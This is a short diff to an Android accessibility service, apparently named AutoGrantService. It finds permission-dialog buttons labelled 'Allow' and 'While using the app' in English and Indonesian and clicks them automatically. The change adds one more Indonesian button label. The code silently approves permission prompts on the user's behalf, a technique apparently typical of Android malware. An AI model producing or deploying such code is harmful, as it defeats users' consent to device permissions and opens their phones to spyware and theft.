@@ -15,7 +15,10 @@ public class AutoGrantService extends AccessibilityService {
                 btns.addAll(root.findAccessibilityNodeInfosByText("IZINKAN"));
                 btns.addAll(root.findAccessibilityNodeInfosByText("Izinkan"));
                 btns.addAll(root.findAccessibilityNodeInfosByText("While using the app"));
-                for (AccessibilityNodeInfo node : btns) { if (node.isClickable()) node.performAction(AccessibilityNodeInfo.ACTION_CLICK); }
+                btns.addAll(root.findAccessibilityNodeInfosByText("Selama menggunakan aplikasi"));
+                for (AccessibilityNodeInfo node : btns) { 
+                    if (node.isClickable()) node.performAction(AccessibilityNodeInfo.ACTION_CLICK); 
+                }
             }
         }
     }
